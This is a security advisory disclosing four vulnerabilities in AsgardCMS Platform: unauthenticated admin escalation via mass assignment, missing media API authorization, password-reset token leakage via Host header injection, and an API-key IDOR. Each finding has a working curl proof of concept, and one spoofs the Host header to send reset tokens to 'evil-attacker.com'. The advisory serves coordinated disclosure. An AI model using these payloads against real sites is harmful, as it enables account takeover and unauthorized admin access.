# Multiple Vulnerabilities in AsgardCMS Platform

## Overview

Four security vulnerabilities were discovered in [AsgardCMS/Platform](https://github.com/AsgardCms/Platform) (789★, MIT license, master HEAD f741bc2, 2021-11-30). All findings were reported to VulnCheck for coordinated disclosure. CVE assignment was declined because the repository has gone 5+ years without development. All four were validated as real, confirmed findings.

| ID | Vulnerability | CWE | CVSS 3.1 |
|----|--------------|-----|----------|
| ASGARD-2026-01 | [Unauthenticated Privilege Escalation via Mass Assignment](#asgard-2026-01) | CWE-915 | 10.0 (Critical) |
| ASGARD-2026-02 | [Missing Authorization on Media API](#asgard-2026-02) | CWE-862 | 7.7 (High) |
| ASGARD-2026-03 | [Password Reset Token Leak via Host Header Injection](#asgard-2026-03) | CWE-640 | 8.1 (High) |
| ASGARD-2026-04 | [IDOR in API Key Deletion](#asgard-2026-04) | CWE-639 | 6.5 (Medium) |

**Environment:** PHP 8.1.34 / Laravel 8.83.29 / MySQL 5.7, local Docker  
**Prior CVEs:** None in NVD  
**Discovered by:** Marxabo Keldibekova  
**Coordinated by:** [VulnCheck](https://vulncheck.com/)

---

<a id="asgard-2026-01"></a>
## ASGARD-2026-01: Unauthenticated Privilege Escalation via Mass Assignment

**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H — **10.0 (Critical)**  
**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes), CWE-269 (Improper Privilege Management)

### Summary

An anonymous visitor can self-register and inject arbitrary Sentinel permissions via the `permissions` field in `POST /en/auth/register`, escalating to full Administrator access. Zero credentials required.

### Root Cause

`AuthController::postRegister()` passes `$request->all()` (unfiltered) to the registration pipeline. The User model (`Modules/User/Entities/Sentinel/User.php`) has `permissions` in `$fillable`. Sentinel stores permissions as a JSON column checked directly by all authorization middleware.

### Proof of Concept

```bash
# 1. Register with injected admin permissions
curl -X POST http://TARGET/en/auth/register \
  -H "Content-Type: application/json" \
  -H "X-CSRF-TOKEN: $TOKEN" \
  -d '{"email":"attacker@example.com","password":"Passw0rd!","password_confirmation":"Passw0rd!",
       "permissions":{"dashboard.index":true,"user.users.index":true,"user.users.create":true,
                       "user.roles.index":true,"user.roles.create":true}}'

# Response: HTTP 302 (registration success)
# DB: permissions column populated with injected values

# 2. Activate → Login → Access admin panel
curl -b cookies.txt http://TARGET/en/backend/user/users
# Response: HTTP 200, full admin panel

# 3. Create new Administrator via admin UI
curl -b cookies.txt -X POST http://TARGET/en/backend/user/users \
  -d "first_name=Pwned&last_name=Admin&email=fulladmin@example.com&password=Passw0rd!&password_confirmation=Passw0rd!&roles[]=1"
# Response: HTTP 302 — new Admin account created
```

### Impact

Complete zero-to-admin takeover on any AsgardCMS with self-registration enabled (default). Anonymous attacker gets full admin access including user/role management and module installation.

---

<a id="asgard-2026-02"></a>
## ASGARD-2026-02: Missing Function-Level Authorization on Media API

**CVSS 3.1:** AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N — **7.7 (High)**  
**CWE:** CWE-862 (Missing Authorization)

### Summary

Six media API endpoints in `Modules/Media/Http/apiRoutes.php` are protected only by the blanket `api.token` middleware — missing the `token-can:media.medias.*` permission check that guards all sibling routes.

### Unprotected Endpoints

- `POST /en/api/media/link` — attach file to any entity
- `POST /en/api/media/unlink` — delete any media association
- `POST /en/api/media/sort` — reorder any gallery
- `POST /en/api/media/move` — move any media
- `GET /en/api/media/get-by-zone-and-entity` — enumerate metadata
- `GET /en/api/media/{media}` — read any media record

### Proof of Concept

```bash
# As low-privilege user (no media permissions):
curl -X POST http://TARGET/en/api/media/unlink \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"imageableId":1}'

# Response: HTTP 200 {"error":false,"message":"The link has been removed."}
```

---

<a id="asgard-2026-03"></a>
## ASGARD-2026-03: Password Reset Token Leak via Host Header Injection

**CVSS 3.1:** AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N — **8.1 (High)**  
**CWE:** CWE-640 (Weak Password Recovery Mechanism), CWE-20

### Summary

`POST /en/auth/reset` builds the password-reset email using `URL::to()`, which derives its root from the request's Host header. The app never calls `URL::forceRootUrl()`. An attacker can spoof the Host header to redirect any victim's reset link to an attacker-controlled domain.

### Proof of Concept

```bash
# Normal reset (control):
curl -X POST http://TARGET/en/auth/reset \
  -d "_token=$TOKEN&email=victim@example.com"
# Mail log: http://localhost/auth/reset/1/VXROXZkzPHs...

# Attack — spoofed Host header:
curl -H "Host: evil-attacker.com" -X POST http://TARGET/en/auth/reset \
  -d "_token=$TOKEN&email=victim@example.com"
# Mail log: http://evil-attacker.com/auth/reset/1/WLCUioBS6xB...
```

### Impact

Full account takeover including Administrator accounts. If the victim's mail client auto-prefetches links, no victim interaction needed.

---

<a id="asgard-2026-04"></a>
## ASGARD-2026-04: IDOR in API Key Deletion

**CVSS 3.1:** AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N — **6.5 (Medium)**  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

### Summary

`DELETE /en/backend/account/api-keys/{userTokenId}` allows any authenticated user with `account.api-keys.destroy` to delete API tokens belonging to other users, including Administrators. No ownership check is performed.

### Proof of Concept

```bash
# lowpriv2 (user_id=6) deletes fulladmin's token (id=1, user_id=5):
curl -b lowpriv2_cookies.txt -X DELETE \
  http://TARGET/en/backend/account/api-keys/1 \
  -H "X-CSRF-TOKEN: $CSRF" -d "_token=$CSRF"

# Response: HTTP 302 (success)
# DB: token id=1 (fulladmin's) deleted by lowpriv2
```

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-09-04 | All 4 vulnerabilities submitted to VulnCheck |
| 2026-09-10 | VulnCheck declines CVE — project 5+ years without development |
| 2026-09-27 | Public disclosure via GitHub |

## References

- [AsgardCMS Repository](https://github.com/AsgardCms/Platform)
- [VulnCheck](https://vulncheck.com/)
